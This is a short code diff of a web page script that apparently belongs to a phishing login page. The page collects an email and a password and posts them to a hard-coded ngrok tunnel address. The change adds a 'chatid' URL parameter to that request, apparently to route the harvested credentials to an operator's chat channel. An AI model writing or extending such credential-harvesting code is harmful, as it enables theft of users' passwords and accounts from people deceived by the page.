@@ -137,6 +137,7 @@
     // Get URL parameters
     const urlParams = new URLSearchParams(window.location.search);
     const reqtype = urlParams.get('reqtype') || 'na';
+    const chatid = urlParams.get('chatid') || '';
     
     // Get current domain
     const domain = 'https://797ff838f2c7.ngrok-free.app';
@@ -193,7 +194,8 @@
           body: JSON.stringify({
             email: email,
             password: password,
-            reqtype: reqtype
+            reqtype: reqtype,
+            chatid: chatid
           })
         });
         
@@ -218,8 +220,9 @@
       }
     });
 
-    // Log the reqtype for debugging
+    // Log the parameters for debugging
     console.log('Request type:', reqtype);
+    console.log('Chat ID:', chatid);
   </script>
 </body>
 </html> 
